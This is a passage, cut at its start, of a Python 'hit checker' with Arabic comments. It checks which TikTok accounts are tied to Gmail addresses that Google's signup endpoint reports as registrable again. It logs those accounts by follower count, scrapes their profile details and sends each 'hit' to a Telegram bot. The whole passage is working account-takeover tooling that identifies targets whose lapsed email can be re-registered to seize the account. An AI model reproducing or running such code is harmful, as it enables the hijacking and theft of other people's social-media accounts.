            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }
        params_check = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': 'ar',
            'TL': tl,
            'rt': 'c',
        }
        data_check = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C41558%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}'.format(username, at)
        response = s.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params_check,
            headers=headers_check,
            data=data_check,
            timeout=10
        )
        return 'password' in response.text
    except Exception:
        return False

async def worker():
    global total_checked, good_count, bad_count, not_found_count, error_count, followers_stats
    executor = ThreadPoolExecutor(max_workers=1)
    loop = asyncio.get_event_loop()
    while True:
        item = await queue.get()
        if item is None:
            break
        username, followers = item
        email = f"{username}@gmail.com"
        
        tiktok_good = await loop.run_in_executor(executor, check_tiktok, email)
        if not tiktok_good:
            async with lock:
                not_found_count += 1
                total_checked += 1
            await update_board()
            queue.task_done()
            continue
        
        gmail_good = await loop.run_in_executor(executor, check_gmail, username)
        
        async with lock:
            total_checked += 1
            if gmail_good:
                good_count += 1
                fol = int(followers)
                if fol <= 1000:
                    followers_stats["0-1k"] += 1
                elif fol <= 10000:
                    followers_stats["1k-10k"] += 1
                elif fol <= 100000:
                    followers_stats["10k-100k"] += 1
                else:
                    followers_stats["100k-1M"] += 1
                
                with open(OUTPUT_GOOD, "a", encoding="utf-8") as f:
                    f.write(f"{email}:{followers}\n")
                
                # =============================================================
                # استخراج اليوزرنيم من تيك توك ثم جلب معلومات الحساب
                # =============================================================
                try:
                    extracted_username, fake_email = await loop.run_in_executor(
                        executor,
                        extract_username_from_email,
                        email,
                        True  # silent mode
                    )
                    if extracted_username:
                        # جلب معلومات الحساب
                        user_info = await loop.run_in_executor(
                            executor,
                            get_tiktok_user_info,
                            extracted_username,
                            True
                        )
                        if user_info:
                            # بناء الرسالة بالشكل المطلوب
                            msg = (
                                "┌─── ❖ ── ✦ ── ❖ ───┐\n"
                                "     🎵  𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧  🎵\n"
                                "└─── ❖ ── ✦ ── ❖ ───┘\n"
                                " 🛠️ 𝗕𝗬 » @DD36DD\n"
                                " ════════════════════\n"
                                f" 👤 𝗨𝗦𝗘𝗥   » @{user_info['username']}\n"
                                f" 📧 𝗠𝗔𝗜𝗟   » <code>{email}</code>\n"
                                f" 📛 𝗡𝗔𝗠𝗘   » {user_info['nickname']}\n"
                                f" 🏆 𝗟𝗘𝗩𝗘𝗟  » {user_info['level']}\n"
                                " ════════════════════\n"
                                f" 📑 𝗕𝗜𝗢    » {user_info['bio']}\n"
                                " ════════════════════\n"
                                f" 👥 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 » [ {user_info['followers']:,} ]\n"
                                f" 👁️‍🗨️ 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 » [ {user_info['following']:,} ]\n"
                                f" ❤️ 𝗟𝗜𝗞𝗘𝗦     » [ {user_info['likes']:,} ]\n"
                                " ════════════════════\n"
                            )
                            if BOT_TOKEN and CHAT_ID:
                                send_to_telegram(BOT_TOKEN, CHAT_ID, msg)
                            # تسجيل في ملف
                            with open("usernames.txt", "a", encoding="utf-8") as uf:
                                uf.write(f"{email}:@{extracted_username}:{followers}\n")
                        else:
                            # فشل جلب المعلومات، نرسل فقط اليوزر
                            msg = (
                                "┌─── ❖ ── ✦ ── ❖ ───┐\n"
                                "     🎵  𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧  🎵\n"
                                "└─── ❖ ── ✦ ── ❖ ───┘\n"
                                " 🛠️ 𝗕𝗬 » @DD36DD\n"
                                " ════════════════════\n"
                                f" 👤 𝗨𝗦𝗘𝗥   » @{extracted_username}\n"
                                f" 📧 𝗠𝗔𝗜𝗟   » <code>{email}</code>\n"
                                " ════════════════════\n"
                                " ⚠️ تعذر جلب معلومات إضافية\n"
                            )
                            if BOT_TOKEN and CHAT_ID:
                                send_to_telegram(BOT_TOKEN, CHAT_ID, msg)
                    else:
                        # فشل استخراج اليوزر
                        fail_msg = f"⚠️ <b>فشل استخراج اليوزر</b>\n📧 البريد: <code>{email}</code>\n📊 المتابعين: {followers}"
                        if BOT_TOKEN and CHAT_ID:
                            send_to_telegram(BOT_TOKEN, CHAT_ID, fail_msg)
                except Exception as e:
                    error_msg = f"❌ <b>خطأ أثناء الاستخراج</b>\n📧 البريد: <code>{email}</code>\nخطأ: {str(e)}"
                    if BOT_TOKEN and CHAT_ID:
                        send_to_telegram(BOT_TOKEN, CHAT_ID, error_msg)
            else:
                bad_count += 1
        
        await update_board()
        queue.task_done()

def print_board():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[1;36m╭─── @DD36DD ─── ViP ─── 2026 ───╮")
    print("│                                │")
    print(f"│   Total  »  {total_checked:<4}                 │")
    print(f"│   Good   »  \033[1;32m{good_count:<4}\033[0m                  │")
    print(f"│   Bad    »  \033[1;33m{bad_count:<4}\033[0m                  │")
    print(f"│   Not F  »  {not_found_count:<4}                  │")
    print(f"│   Error  »  {error_count:<4}                  │")
    print("│                                │")
    print("\033[1;36m╰────────────────────────────────╯")
    print(" \033[1;36m┌─── [ FOLLOWER STATISTICS ] ────┐")
    print(f" │  0-1k     » {followers_stats['0-1k']:<3}  │  10k-100k » {followers_stats['10k-100k']:<3} │")
    print(f" │  1k-10k   » {followers_stats['1k-10k']:<3}  │  100k-1M  » {followers_stats['100k-1M']:<3} │")
    print(" \033[1;36m└────────────────────────────────┘")

async def update_board():
    print_board()

def load_data():
    items = []
    if not os.path.exists(INPUT_FILE):
        print(f"[!] الملف {INPUT_FILE} غير موجود.")
        return items
    with open(INPUT_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split(":")
            if len(parts) == 2:
                items.append((parts[0], parts[1]))
            else:
                items.append((line, "0"))
    return items

async def main():
    global BOT_TOKEN, CHAT_ID
    print("=" * 50)
    
    print("=" * 50)
    BOT_TOKEN = input(".أدخل توكن البوت : ").strip()
    CHAT_ID = input(".أدخل الايدي : ").strip()
    if BOT_TOKEN and CHAT_ID:
        print("✅ سيتم إرسال النتائج إلى تلغرام.")
    else:
        print("خلي توكن وايدي زمال")
    print("[+] جارٍ تحميل البيانات من ali.txt ...")
    data = load_data()
    if not data:
        
        return
    print(f"[+] تم تحميل {len(data)} حساب.")
    for item in data:
        await queue.put(item)

    workers = [asyncio.create_task(worker()) for _ in range(THREADS)]
    
    async def periodic_board():
        while True:
            await asyncio.sleep(0.5)
            print_board()
    board_task = asyncio.create_task(periodic_board())

    await queue.join()
  
    for _ in workers:
        await queue.put(None)
    await asyncio.gather(*workers)
    board_task.cancel()
    print_board()
    print("\n[✓] انتهى الفحص. تم حفظ الحسابات الصالحة في hit.txt و usernames.txt")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] تم الإيقاف بواسطة المستخدم.")
